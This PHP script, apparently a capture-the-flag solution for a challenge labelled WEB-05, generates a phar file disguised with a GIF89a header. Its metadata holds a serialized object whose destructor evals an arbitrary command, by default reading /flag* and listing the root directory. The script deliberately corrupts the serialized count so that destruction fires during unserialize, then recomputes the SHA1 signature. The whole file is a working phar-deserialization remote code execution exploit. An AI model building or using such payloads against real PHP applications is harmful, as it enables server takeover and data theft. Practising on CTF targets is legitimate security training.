<?php
// WEB-05 — 生成「元数据致残 + 重签名」的 GIF 头 phar
// 用法: php -d phar.readonly=0 makephar.php [命令]
// 默认命令读 /flag*；生成 evil.phar 后按 SOLVE.md 的 curl 打点。
$cmd = $argv[1] ?? 'system("cat /flag* 2>/dev/null; echo -----; ls -la /;");';

class AnyClass {
    var $output = 'echo "ok";';
    function __destruct() { eval($this->output); }
}

$o = new AnyClass();
$o->output = $cmd;

@unlink('evil.phar');
$p = new Phar('evil.phar');
$p->startBuffering();
$p->setStub("GIF89a;<?php __HALT_COMPILER(); ?>");   // GIF 头过 finfo
$p->setMetadata($o);
$p->addFromString('x.txt', 'x');
$p->stopBuffering();

// 元数据 :1:{ -> :2:{（等长致残）：unserialize 期间半成品对象立即析构，
// 绕过靶机 fatal error 堵死的 shutdown 析构路径
$data = file_get_contents('evil.phar');
$meta = serialize($o);
$pos  = strpos($data, $meta);
if ($pos === false) { fwrite(STDERR, "metadata not found\n"); exit(1); }
$bad  = str_replace(':1:{', ':2:{', $meta);
$data = substr_replace($data, $bad, $pos, strlen($meta));
$sigstart = strlen($data) - 28;                      // sig(20)+flags(4)+GBMB(4)
$newsig = sha1(substr($data, 0, $sigstart), true);
file_put_contents('evil.phar',
    substr($data, 0, $sigstart) . $newsig . substr($data, $sigstart + 20));
$o->output = ';';                                    // 中和本地析构，别在本机执行命令
echo "evil.phar written (" . filesize('evil.phar') . " bytes)\n";
